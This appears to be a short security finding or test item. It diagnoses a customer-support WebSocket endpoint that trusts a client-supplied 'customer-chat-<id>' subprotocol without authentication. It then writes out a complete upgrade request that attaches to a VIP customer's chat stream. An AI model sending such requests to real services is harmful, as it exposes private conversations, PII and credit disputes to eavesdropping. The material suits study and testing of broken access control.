diagnosis: The customer support WebSocket endpoint parses customer-chat-<customerId> from the Sec-WebSocket-Protocol header and immediately attaches the socket to the real-time customer support stream. Because client-declared subprotocols are trusted without validating customer authentication or staff role credentials, an attacker can eavesdrop on private customer service conversations, PII, and credit dispute discussions.
exploit_request:
GET /ws/chat HTTP/1.1
Host: support.desk-cloud.com:8081
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: bWVzc2FnZS1rZXktMQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: chat.v2, customer-chat-cust_vip_48291
